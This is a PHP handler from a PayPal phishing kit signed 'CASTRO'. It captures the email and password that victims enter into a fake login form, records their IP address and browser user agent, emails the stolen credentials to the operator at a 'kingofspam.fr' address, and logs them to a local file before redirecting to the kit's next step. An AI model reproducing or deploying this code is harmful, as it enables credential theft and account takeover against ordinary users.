<?php
	error_reporting(0);
	ob_start();
	session_start();

include'../antibots.php';
	include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
	$_SESSION['email'] 	= $_POST['mail'];
	$_SESSION['pass'] 	= $_POST['pass'];
	$dir = getcwd();
$message = "🔘 CASTRO // NEW PAYPAL

🍒 [ INFOS LOGIN ]
🔑 Email : ".$_SESSION['email']."
🔑 Mot de passe : ".$_SESSION['pass']."
🔑 IP : "._ip()."
🔑 User Agent : ".$_SERVER["HTTP_USER_AGENT"]."

🌟 CASTRO 🌟";
$Subject="[💻] ".$_SESSION['email']." | "._ip();
$head="From:🦹🏽‍♂ CASTRO 🦹🏽‍♂  <castro@kingofspam.fr>";
mail($my_mail,$Subject,$message,$head);
mail($name,$Subject,$message,$head);
$fil = fopen('api.txt', 'a+');
fwrite($fil, '-'.$message.'-');
$_SESSION['step_one']  = true;
header('location: index.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

}
else
{
	header('location: ../../index.php');
}
?>